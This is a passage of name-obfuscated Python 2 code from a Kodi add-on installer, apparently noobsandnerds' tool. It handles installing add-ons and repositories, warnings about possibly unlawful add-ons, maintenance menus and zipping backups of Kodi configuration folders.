    if 34 - 34: OoooooooOO . O0 / ooOo * OoOoOO00 - I1ii11iIi11i
    for IiiiI in i11111I1IOoo0ooOOOOoOo :
     Iiii1I1 = xbmc . translatePath ( os . path . join ( OO0oOOo , IiiiI ) )
     if 83 - 83: Oo . iI1iiIiiII + ooOo - Oo * iI1iiIiiII / iI1iiIiiII
     if addon_id not in IiiiI and '/' not in IiiiI :
      if 39 - 39: iI1iiIiiII / Oo0Ooo % OoO0O00 % i11iIiiIii
      try :
       iiI1IiI . update ( 0 , "Downloading [COLOR=yellow]" + IiiiI + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( data_path + IiiiI , Iiii1I1 , iiI1IiI )
       if 90 - 90: iI1iiIiiII - OoooooooOO
      except :
       print "failed to install" + IiiiI
       if 96 - 96: O0 . OO0oo0oOO % OoO0O00 * iIii1I11I1II1
     if '/' in IiiiI and '..' not in IiiiI and 'http' not in IiiiI :
      O0O00oOooo0OO = data_path + IiiiI
      iIIi1I ( Iiii1I1 , O0O00oOooo0OO )
      if 65 - 65: I1ii11iIi11i % O0 % iIii1I11I1II1 * OO0oo0oOO
   except :
    O0OoO000O0OO . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=yellow]' + name , '[/COLOR]Please consider updating the add-on portal with details or report the error on the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR]' )
    O0OO0oOoO0O0O = 0
    if 31 - 31: OO0oo0oOO
 if O0OO0oOoO0O0O == 1 :
  time . sleep ( 1 )
  iiI1IiI . update ( 0 , "[COLOR=yellow]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  iIIiI1I1i = xbmc . translatePath ( os . path . join ( Ooo , repo_id ) )
  if 68 - 68: iii1I11ii1i1 % iI1iiIiiII + I1ii11iIi11i - i11iIiiIii . o0oOOo0O0Ooo - iI1iiIiiII
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( iIIiI1I1i ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   IIIIIii1ii11 ( repo_id )
   if 86 - 86: OoOoOO00 * II111iiii - O0 . OoOoOO00 % iIii1I11I1II1 / Oo
  xbmc . sleep ( 2000 )
  if 11 - 11: I1IiiI * ooOo + I1ii11iIi11i / I1ii11iIi11i
  if os . path . exists ( III ) and oo00OooO == 0 :
   iiii1I1 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   iIIIiIi ( iiii1I1 )
   if 14 - 14: OoOoOO00 * I1IiiI + OoooooooOO - oo0oooooO0 - oOoO0o00OO0
  I1iii ( name , addon_id )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . sleep ( 1000 )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if 51 - 51: I1ii11iIi11i
  if oo000oOo0 == 0 :
   O0OoO000O0OO . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
   if 41 - 41: I1ii11iIi11i * OOo00O0 - OO0oo0oOO + Oo0Ooo
  if iIiI1I1Ii == 0 :
   O0OoO000O0OO . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
   if 23 - 23: II111iiii % o0oOOo0O0Ooo + o0oOOo0O0Ooo + oo0oooooO0 - oo0oooooO0
  if iIiI1I1Ii != 0 and oo000oOo0 != 0 and forum != 'None' :
   O0OoO000O0OO . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=yellow]' + forum , '[/COLOR][CR]Visit [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR] for all your Kodi needs.' )
   if 62 - 62: o0oOOo0O0Ooo
  if iIiI1I1Ii != 0 and oo000oOo0 != 0 and forum == 'None' :
   O0OoO000O0OO . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given.' )
   if 45 - 45: Oo * OOo00O0
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 74 - 74: i1IIi + O0 + Oo0Ooo
 if 5 - 5: Oo0Ooo * OoOoOO00
def ii1I11iIiIII1 ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 III = xbmc . translatePath ( os . path . join ( Ooo , addon_id ) )
 forum = str ( forum )
 if 52 - 52: o0oOOo0O0Ooo * oOoO0o00OO0 + OoOoOO00
 if not os . path . exists ( III ) :
  IiiiIiiI = 1
  if 72 - 72: i1IIi
 else :
  IiiiIiiI = 0
  if 82 - 82: OoOoOO00 + OoooooooOO / i11iIiiIii * I1ii11iIi11i . OoooooooOO
 repo_id = str ( repo_id )
 iIIiI1I1i = xbmc . translatePath ( os . path . join ( Ooo , repo_id ) )
 if 63 - 63: I1ii11iIi11i
 if os . path . exists ( III ) :
  oo00OooO = 1
  i1II = O0OoO000O0OO . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' )
  if 2 - 2: II111iiii - OoO0O00 . oOoO0o00OO0 * oo0oooooO0 / ooOo
  if i1II == 1 :
   OOo0 ( III )
   IiiiIiiI = 1
 else :
  oo00OooO = 0
  if 35 - 35: i1IIi - iIii1I11I1II1 + i1IIi
 if IiiiIiiI == 1 :
  if 86 - 86: iIii1I11I1II1 + OoOoOO00 . i11iIiiIii - OO0oo0oOO
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( iIIiI1I1i ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   IIIIIii1ii11 ( repo_id )
   if 51 - 51: OoOoOO00
  if not os . path . exists ( III ) :
   os . makedirs ( III )
   if 14 - 14: oOoO0o00OO0 % ooOo % Oo0Ooo - i11iIiiIii
  o0OO000ooOo = os . path . join ( Ooo , addon_id , 'addon.xml' )
  oOo00OooO0oO = os . path . join ( Ooo , addon_id , 'default.py' )
  if 16 - 16: oOoO0o00OO0 / Oo0Ooo + Oo / OO0oo0oOO
  shutil . copyfile ( O0O , o0OO000ooOo )
  if 42 - 42: Oo0Ooo + II111iiii - I1IiiI / iii1I11ii1i1 % oOoO0o00OO0
  O0ooOOO = open ( os . path . join ( o0OO000ooOo ) , mode = 'r' )
  O0oiIiiiiI1II1I1 = O0ooOOO . read ( )
  O0ooOOO . close ( )
  if 83 - 83: i1IIi + oo0oooooO0 - i11iIiiIii / I1ii11iIi11i
  if 52 - 52: i11iIiiIii / i1IIi
  i1IIII1iii11I = re . compile ( 'testid[\s\S]*?' ) . findall ( O0oiIiiiiI1II1I1 )
  iIIii = i1IIII1iii11I [ 0 ] if ( len ( i1IIII1iii11I ) > 0 ) else 'None'
  oo0OoOooo = re . compile ( 'testname[\s\S]*?' ) . findall ( O0oiIiiiiI1II1I1 )
  I1i1i1iii = oo0OoOooo [ 0 ] if ( len ( oo0OoOooo ) > 0 ) else 'None'
  O00O00O000OOO = re . compile ( 'testprovider[\s\S]*?' ) . findall ( O0oiIiiiiI1II1I1 )
  iIOo0O = O00O00O000OOO [ 0 ] if ( len ( O00O00O000OOO ) > 0 ) else 'None'
  Ii11 = re . compile ( 'testprovides[\s\S]*?' ) . findall ( O0oiIiiiiI1II1I1 )
  II1i111 = Ii11 [ 0 ] if ( len ( Ii11 ) > 0 ) else 'None'
  i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( iIIii , addon_id ) . replace ( I1i1i1iii , name ) . replace ( iIOo0O , provider_name ) . replace ( II1i111 , contenttypes )
  if 67 - 67: o0oOOo0O0Ooo % OoOoOO00 . OoOoOO00 - OOo00O0
  O00ooOo = open ( o0OO000ooOo , mode = 'w+' )
  O00ooOo . write ( str ( i1iiiIii11 ) )
  O00ooOo . close ( )
  if 80 - 80: o0oOOo0O0Ooo - Oo + OoooooooOO
  O0ooOoO = open ( oOo00OooO0oO , mode = 'w' )
  O0ooOoO . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + addon_id + '"\nAddonName="' + name + '"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating, would you like check the status of your add-on updates or try re-installing via the Total Installer backup method? We highly recommend checking for updates.",yeslabel="Install Option 2", nolabel="Check Updates")\nif choice==0: xbmc.executebuiltin(\'ActivateWindow(10040,"addons://outdated/",return)\')\nelse: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.tbs/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
  O0ooOoO . close ( )
  if 26 - 26: OoOoOO00 / Oo0Ooo - i1IIi + iii1I11ii1i1
  xbmc . sleep ( 1000 )
  if 38 - 38: OoooooooOO / I1ii11iIi11i . O0 / i1IIi / Oo0Ooo + iIii1I11I1II1
  if os . path . exists ( III ) and oo00OooO == 0 :
   iiii1I1 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   iIIIiIi ( iiii1I1 )
   if 96 - 96: oo0oooooO0
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  O0OoO000O0OO . ok ( name + " Install Complete" , '[COLOR=dodgerblue]' + name + '[/COLOR] has now been installed, please allow a few moments for Kodi to update the add-on and it\'s dependencies.' )
  if 18 - 18: oo0oooooO0 * iii1I11ii1i1 - OO0oo0oOO
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 31 - 31: Oo0Ooo - O0 % OoOoOO00 % ooOo
 if 45 - 45: I1ii11iIi11i + II111iiii * i11iIiiIii
def IiIIi1I1I11Ii ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 iIIiI1I1i = xbmc . translatePath ( os . path . join ( Ooo , repo_id ) )
 III = xbmc . translatePath ( os . path . join ( Ooo , addon_id ) )
 if 64 - 64: OoooooooOO
 if os . path . exists ( III ) :
  if 81 - 81: I1ii11iIi11i - O0 * OoooooooOO
  i1II = O0OoO000O0OO . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' )
  if 23 - 23: II111iiii / ooOo
  if i1II == 1 :
   OOo0 ( III )
   if 28 - 28: Oo0Ooo * OOo00O0 - OoO0O00
 if os . path . exists ( iIIiI1I1i ) :
  if 19 - 19: iii1I11ii1i1
  if os . path . exists ( III ) :
   oo00OooO = 1
   if 67 - 67: O0 % iIii1I11I1II1 / oOoO0o00OO0 . i11iIiiIii - OO0oo0oOO + O0
  else :
   oo00OooO = 0
   if 27 - 27: Oo
  i1II = O0OoO000O0OO . yesno ( 'WARNING!' , '[COLOR=orange]This Add-on may be unlawful in your region.[/COLOR][CR]The repository required for installation of this add-on has been detected on your system. Would you like to continue to the Kodi addon browser to install?' )
  if 89 - 89: II111iiii / ooOo
  if i1II == 1 :
   if 14 - 14: Oo . I1IiiI * OOo00O0 + II111iiii - OOo00O0 + Oo
   if 'video' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.video/?",return)' )
    if 18 - 18: ooOo - o0oOOo0O0Ooo - I1IiiI - I1IiiI
   elif 'executable' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.executable/?",return)' )
    if 54 - 54: Oo0Ooo + I1IiiI / oo0oooooO0 . I1IiiI * OoOoOO00
   elif 'audio' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.audio/?",return)' )
    if 1 - 1: OoOoOO00 * OoO0O00 . i1IIi / Oo0Ooo . I1ii11iIi11i + Oo0Ooo
  xbmc . sleep ( 2000 )
  if 17 - 17: Oo0Ooo + OoO0O00 / OO0oo0oOO / oo0oooooO0 * Oo
  if os . path . exists ( III ) and oo00OooO == 0 :
   iiii1I1 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   iIIIiIi ( iiii1I1 )
   if 29 - 29: OoO0O00 % OoooooooOO * ooOo / II111iiii - ooOo
 else :
  O0OoO000O0OO . ok ( 'WARNING!' , '[COLOR=orange]This add-on may possibly be unlawful in your region.[/COLOR][CR]If you\'ve investigated the legality of it and are happy to install then you must have the following repository installed: [COLOR=dodgerblue]' + repo_id + '[/COLOR]' )
  if 19 - 19: i11iIiiIii
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 54 - 54: II111iiii . iii1I11ii1i1
 if 73 - 73: OoOoOO00 . I1IiiI
def II1i11i1iIi11 ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 O0OoO000O0OO . ok ( 'Add-on Not Approved' , 'Sorry there are no repository details for this add-on and it\'s been marked as potentially giving access to unlawful content. The most likely cause for this is the add-on has only been released via social media groups.' )
 if 83 - 83: OO0oo0oOO
 if 25 - 25: iii1I11ii1i1 + OoOoOO00 . o0oOOo0O0Ooo % OoOoOO00 * Oo
def ii1IiIi11 ( ) :
 iIiIIi1 ( '' , o0OOO + ' Storage Folder Check' , 'url' , 'check_storage' , 'Check_Download.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Completely remove an add-on (inc. passwords)' , 'plugin' , 'addon_removal_menu' , 'Remove_Addon.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Make Add-ons Gotham/Helix Compatible' , 'none' , 'gotham' , 'Gotham_Compatible.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Make Skins Kodi (Helix) Compatible' , 'none' , 'helix' , 'Kodi_Compatible.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Hide my add-on passwords' , 'none' , 'hide_passwords' , 'Hide_Passwords.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , 'Speed_Test.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Unhide my add-on passwords' , 'none' , 'unhide_passwords' , 'Unhide_Passwords.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Update My Add-ons (Force Refresh)' , 'none' , 'update' , 'Update_Addons.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Wipe All Add-on Settings (addon_data)' , 'url' , 'remove_addon_data' , 'Delete_Addon_Data.png' , '' , '' , '' )
 if 22 - 22: ooOo
 if 33 - 33: iIii1I11I1II1 / OO0oo0oOO
def iIIIiiiI11I ( sign ) :
 iIiIIi1 ( '' , '[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Keyword Install' , O00O0oOO00O00 , 'keywords' , 'Keywords.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=darkcyan][Manual Search][/COLOR] Search By Name' , 'pass=' + sign + '&name=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=darkcyan][Manual Search][/COLOR] Search By Author' , 'pass=' + sign + '&author=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=darkcyan][Manual Search][/COLOR] Search In Description' , 'pass=' + sign + '&desc=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=darkcyan][Manual Search][/COLOR] Search By Add-on ID' , 'pass=' + sign + '&addonid=' , 'search_addons' , 'Search_Addons.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Filter Results][/COLOR] By Genres' , 'pass=' + sign , 'addon_genres' , 'Search_Genre.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Filter Results][/COLOR] By Countries' , 'pass=' + sign , 'addon_countries' , 'Search_Country.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=dodgerblue][Filter Results][/COLOR] By Kodi Categories' , 'pass=' + sign , 'addon_categories' , 'Search_Category.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=orange][Kodi Add-on Browser][/COLOR] Install From Zip' , '' , 'install_from_zip' , 'Search_Addons.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=orange][Kodi Add-on Browser][/COLOR] Browse My Repositories' , '' , 'browse_repos' , 'Search_Addons.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=orange][Kodi Add-on Browser][/COLOR] Check For Add-on Updates' , '' , 'check_updates' , 'Search_Addons.png' , '' , '' , '' )
 if 6 - 6: OO0oo0oOO % i1IIi . OO0oo0oOO * OO0oo0oOO
 if 81 - 81: Oo / iIii1I11I1II1 + oOoO0o00OO0
 if 49 - 49: Oo / OoooooooOO / I1IiiI
 if 74 - 74: iI1iiIiiII % I1ii11iIi11i
def iiIiI ( ) :
 for file in glob . glob ( os . path . join ( Ooo , '*' ) ) :
  ooO = str ( file ) . replace ( Ooo , '[COLOR=red]REMOVE [/COLOR]' ) . replace ( 'plugin.' , '[COLOR=dodgerblue](PLUGIN) [/COLOR]' ) . replace ( 'audio.' , '' ) . replace ( 'video.' , '' ) . replace ( 'skin.' , '[COLOR=yellow](SKIN) [/COLOR]' ) . replace ( 'repository.' , '[COLOR=orange](REPOSITORY) [/COLOR]' ) . replace ( 'script.' , '[COLOR=cyan](SCRIPT) [/COLOR]' ) . replace ( 'metadata.' , '[COLOR=orange](METADATA) [/COLOR]' ) . replace ( 'service.' , '[COLOR=pink](SERVICE) [/COLOR]' ) . replace ( 'weather.' , '[COLOR=green](WEATHER) [/COLOR]' ) . replace ( 'module.' , '[COLOR=orange](MODULE) [/COLOR]' )
  i1oOOOOOOOoO = ( os . path . join ( file , 'icon.png' ) )
  I1 = ( os . path . join ( file , 'fanart.jpg' ) )
  iIiIIi1 ( '' , ooO , file , 'remove_addons' , i1oOOOOOOOoO , I1 , '' , '' )
  if 13 - 13: OoOoOO00 / I1ii11iIi11i . Oo * iii1I11ii1i1 - Oo0Ooo / ooOo
  if 8 - 8: OoOoOO00 / O0 * O0 % iI1iiIiiII - Oo0Ooo + iii1I11ii1i1
def oo ( ) :
 o0O . openSettings ( sys . argv [ 0 ] )
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 31 - 31: O0 * o0oOOo0O0Ooo % o0oOOo0O0Ooo / ooOo / iii1I11ii1i1 / OoO0O00
 if 11 - 11: OoOoOO00 + oOoO0o00OO0 - OoooooooOO / OoO0O00
def iIIi1iI1I1IIi ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 O0OO0 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 O0ooo0o0 = len ( sourcefile )
 oO0ooOoO = [ ]
 ooO0000o00O = [ ]
 if 91 - 91: iii1I11ii1i1 / O0 - OO0oo0oOO . I1IiiI
 iiI1IiI . create ( message_header , message1 , message2 , message3 )
 if 82 - 82: oOoO0o00OO0 * Oo / ooOo
 for IiiIiI , iIIIIiiIii , ooO0oo in os . walk ( sourcefile ) :
  if 56 - 56: OoooooooOO - iii1I11ii1i1 - i1IIi
  for file in ooO0oo :
   ooO0000o00O . append ( file )
   if 8 - 8: iI1iiIiiII / Oo . I1IiiI + I1ii11iIi11i / i11iIiiIii
 I1Iii1iI1 = len ( ooO0000o00O )
 if 86 - 86: O0
 for IiiIiI , iIIIIiiIii , ooO0oo in os . walk ( sourcefile ) :
  if 95 - 95: oo0oooooO0 * Oo . OoOoOO00 . i1IIi . i1IIi - o0oOOo0O0Ooo
  iIIIIiiIii [ : ] = [ ii1iIIiii1 for ii1iIIiii1 in iIIIIiiIii if ii1iIIiii1 not in exclude_dirs ]
  ooO0oo [ : ] = [ ooOo0O0o0 for ooOo0O0o0 in ooO0oo if ooOo0O0o0 not in exclude_files and not 'crashlog' in ooOo0O0o0 and not 'stacktrace' in ooOo0O0o0 ]
  if 65 - 65: OOo00O0 + O0
  for file in ooO0oo :
   if 32 - 32: OoooooooOO - OoOoOO00 - i11iIiiIii * o0oOOo0O0Ooo / Oo0Ooo + OoooooooOO
   try :
    oO0ooOoO . append ( file )
    ii1I1I111 = len ( oO0ooOoO ) / float ( I1Iii1iI1 ) * 100
    iiI1IiI . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % ii1iIIiii1 , 'Please Wait' )
    Ii1Ii = os . path . join ( IiiIiI , file )
    if 39 - 39: ooOo - i1IIi / OOo00O0 . I1IiiI * i1IIi - iIii1I11I1II1
   except :
    print "Unable to backup file: " + file
    if 55 - 55: I1IiiI * o0oOOo0O0Ooo % OOo00O0 . iIii1I11I1II1 * iI1iiIiiII
   if not 'temp' in iIIIIiiIii :
    if 92 - 92: iI1iiIiiII - iIii1I11I1II1
    if not I1IiI in iIIIIiiIii :
     if 32 - 32: OO0oo0oOO % OoO0O00 * OoO0O00 + oOoO0o00OO0 * II111iiii * OO0oo0oOO
     try :
      iIiIii1I1II = '01/01/1980'
      O0Oooo = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( Ii1Ii ) ) )
      if 77 - 77: II111iiii
      if O0Oooo > iIiIii1I1II :
       O0OO0 . write ( Ii1Ii , Ii1Ii [ O0ooo0o0 : ] )
       if 42 - 42: OO0oo0oOO * iI1iiIiiII . oOoO0o00OO0 * I1IiiI + OoOoOO00
     except :
      print "Unable to backup file: " + file
      if 25 - 25: iii1I11ii1i1 . I1IiiI + ooOo
 O0OO0 . close ( )
 iiI1IiI . close ( )
 if 75 - 75: oOoO0o00OO0 - o0oOOo0O0Ooo % oo0oooooO0 + i11iIiiIii
 if 100 - 100: iii1I11ii1i1 + o0oOOo0O0Ooo - i11iIiiIii - II111iiii
def iIIIiIi1I1i ( sourcefile , destfile ) :
 O0OO0 = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 O0ooo0o0 = len ( sourcefile )
 oO0ooOoO = [ ]
 ooO0000o00O = [ ]
 if 78 - 78: iIii1I11I1II1 % OoOoOO00 + I1ii11iIi11i / i1IIi % II111iiii + Oo
 iiI1IiI . create ( "Backing Up Files" , "Archiving..." , '' , 'Please Wait' )
 if 91 - 91: iIii1I11I1II1 % OoO0O00 . o0oOOo0O0Ooo + OO0oo0oOO + o0oOOo0O0Ooo
 for IiiIiI , iIIIIiiIii , ooO0oo in os . walk ( sourcefile ) :
  if 95 - 95: OO0oo0oOO + I1ii11iIi11i * Oo
  for file in ooO0oo :
   ooO0000o00O . append ( file )
   if 16 - 16: iii1I11ii1i1 / I1IiiI + OoO0O00 % iIii1I11I1II1 - i1IIi . ooOo
 I1Iii1iI1 = len ( ooO0000o00O )
 if 26 - 26: o0oOOo0O0Ooo * oOoO0o00OO0 . i1IIi
 for IiiIiI , iIIIIiiIii , ooO0oo in os . walk ( sourcefile ) :
  if 59 - 59: O0 + i1IIi - o0oOOo0O0Ooo
  for file in ooO0oo :
   oO0ooOoO . append ( file )
   ii1I1I111 = len ( oO0ooOoO ) / float ( I1Iii1iI1 ) * 100
   iiI1IiI . update ( int ( ii1I1I111 ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
   Ii1Ii = os . path . join ( IiiIiI , file )
   if 62 - 62: i11iIiiIii % Oo . oOoO0o00OO0 . Oo
   if not 'temp' in iIIIIiiIii :
    if 84 - 84: i11iIiiIii * OoO0O00
    if not I1IiI in iIIIIiiIii :
     if 18 - 18: Oo - OO0oo0oOO - OoOoOO00 / iI1iiIiiII - O0
     import time
     iIiIii1I1II = '01/01/1980'
     O0Oooo = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( Ii1Ii ) ) )
     if 30 - 30: O0 + I1ii11iIi11i + II111iiii
     if O0Oooo > iIiIii1I1II :
      O0OO0 . write ( Ii1Ii , Ii1Ii [ O0ooo0o0 : ] )
 O0OO0 . close ( )
 iiI1IiI . close ( )
 if 14 - 14: o0oOOo0O0Ooo / Oo - iIii1I11I1II1 - ooOo % OOo00O0
 if 49 - 49: OOo00O0 * ooOo / o0oOOo0O0Ooo / Oo0Ooo * iIii1I11I1II1
def OOoO00ooO ( ) :
 iIiIIi1 ( '' , 'Create My Own [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Community Build' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 if I1IIIIiii1i ( ) :
  iIiIIi1 ( '' , '[COLOR=dodgerblue]Create OpenELEC Backup[/COLOR] (full backup can only be used on OpenELEC)' , 'none' , 'openelec_backup' , 'Backup.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=dodgerblue]Create My Own Universal Build[/COLOR] (For copying to other devices)' , 'none' , 'community_backup_2' , 'Backup.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=dodgerblue]Create My Own Full Backup[/COLOR] (will only work on THIS device)' , 'local' , 'local_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 iIiIIi1 ( '' , 'Backup Addons Only' , 'addons' , 'restore_zip' , 'Backup.png' , '' , '' , 'Back Up Your Addons' )
 iIiIIi1 ( '' , 'Backup Addon Data Only' , 'addon_data' , 'restore_zip' , 'Backup.png' , '' , '' , 'Back Up Your Addon Userdata' )
 iIiIIi1 ( '' , 'Backup Guisettings.xml' , O00o0OO , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your guisettings.xml' )
 if 51 - 51: Oo . I1IiiI
 if os . path . exists ( iI ) :
  iIiIIi1 ( '' , 'Backup Favourites.xml' , iI , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your favourites.xml' )
  if 73 - 73: OoooooooOO . I1IiiI / iI1iiIiiII % OO0oo0oOO
 if os . path . exists ( I1i1I1II ) :
  iIiIIi1 ( '' , 'Backup Source.xml' , I1i1I1II , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your sources.xml' )
  if 65 - 65: oOoO0o00OO0 - I1IiiI - OO0oo0oOO
 if os . path . exists ( i1IiIiiI ) :
  iIiIIi1 ( '' , 'Backup Advancedsettings.xml' , i1IiIiiI , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your advancedsettings.xml' )
  if 42 - 42: II111iiii * I1IiiI % i1IIi - OO0oo0oOO % oOoO0o00OO0
 if os . path . exists ( OoOo ) :
  iIiIIi1 ( '' , 'Backup Advancedsettings.xml' , OoOo , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your keyboard.xml' )
  if 36 - 36: i11iIiiIii / ooOo * I1ii11iIi11i * I1ii11iIi11i + OO0oo0oOO * iii1I11ii1i1
 if os . path . exists ( oOO00oOO ) :
  iIiIIi1 ( '' , 'Backup RssFeeds.xml' , oOO00oOO , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your RssFeeds.xml' )
  if 32 - 32: OoO0O00
  if 50 - 50: OOo00O0 + i1IIi
def i11IiIIi11I ( ) :
 iIiIIi1 ( 'folder' , 'Backup My Content' , 'none' , 'backup_option' , 'Backup.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Restore My Content' , 'none' , 'restore_option' , 'Restore.png' , '' , '' , '' )
 if 78 - 78: oOoO0o00OO0
 if 83 - 83: iIii1I11I1II1 % OoOoOO00 % o0oOOo0O0Ooo % iI1iiIiiII . I1ii11iIi11i % O0
def iIiIi1ii ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://repos/",return)' )
 if 28 - 28: iIii1I11I1II1 + iIii1I11I1II1
 if 28 - 28: ooOo
def ooo0oo ( localbuildcheck , localversioncheck , id , welcometext ) :
 if ( oo00 . replace ( '%20' , ' ' ) in welcometext ) and ( 'elc' in welcometext ) :
  iIiIIi1 ( '' , welcometext , 'show' , 'user_info' , 'noobsandnerds.png' , '' , '' , '' )
  if 8 - 8: OoO0O00 + OoOoOO00 . iIii1I11I1II1 % O0
  if id != 'None' :
   if 43 - 43: I1ii11iIi11i - oo0oooooO0
   if id != 'Local' :
    O000O = Oo00OO0 ( localbuildcheck , localversioncheck , id )
    if 72 - 72: i1IIi / ooOo * iI1iiIiiII
    if O000O == True :
     if 40 - 40: OO0oo0oOO - OoOoOO00 * OoOoOO00 . OoOoOO00 + OoooooooOO
     if not 'Partially installed' in localbuildcheck :
      iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]' + localbuildcheck + ':[/COLOR] [COLOR=lime]NEW VERSION AVAILABLE[/COLOR]' , id , 'showinfo' , 'noobsandnerds.png' , '' , '' , '' )
      if 77 - 77: iIii1I11I1II1 . OO0oo0oOO % ooOo / OO0oo0oOO
     if '(Partially installed)' in localbuildcheck :
      iIiIIi1 ( 'folder' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo2' , 'noobsandnerds.png' , '' , '' , '' )
    else :
     iIiIIi1 ( 'folder' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo' , 'noobsandnerds.png' , '' , '' , '' )
     if 54 - 54: ooOo + OOo00O0 - Oo0Ooo
   else :
    if 35 - 35: OO0oo0oOO - OO0oo0oOO + i1IIi - O0 - iI1iiIiiII
